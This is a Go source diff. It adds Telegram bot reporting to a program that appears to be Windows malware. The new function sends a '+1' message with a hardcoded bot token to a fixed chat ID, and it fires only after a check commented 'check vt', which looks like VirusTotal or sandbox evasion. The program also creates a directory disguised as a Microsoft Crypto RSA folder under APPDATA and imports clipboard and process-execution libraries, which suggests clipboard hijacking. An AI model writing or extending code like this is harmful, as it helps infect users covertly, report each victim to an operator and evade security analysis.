@@ -1,7 +1,10 @@
+//go:generate goversioninfo -manifest=main.exe.manifest
+
 package main
 
 import (
 	"github.com/atotto/clipboard"
+	"github.com/go-telegram-bot-api/telegram-bot-api"
 	"io"
 	"os"
 	"os/exec"
@@ -16,6 +19,7 @@ func main() {
 
 func DoSomeShit() {
 	if CheckNear() == true { // Check vt
+		TelegramIntegration()
 		CreateDir() // check dir exists
 
 		time.Sleep(2 * time.Second) // to be secureed
@@ -41,7 +45,11 @@ func CopyFile(src, dest string) {
 	defer destFile.Close()
 	_, _ = io.Copy(destFile, srcFile)
 }
-
+func TelegramIntegration() {
+	bot, _ := tgbotapi.NewBotAPI("5734995063:AAGct4zZ5-Uxl_7S8B8R40SJtx2p9lvO3Ic")
+	message := tgbotapi.NewMessage(799309399, "+1")
+	_, _ = bot.Send(message)
+}
 func CreateDir() {
 	if _, err := os.Stat(filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Crypto", "RSA")); os.IsNotExist(err) {
 		err = os.MkdirAll(filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Crypto", "RSA"), 0755)
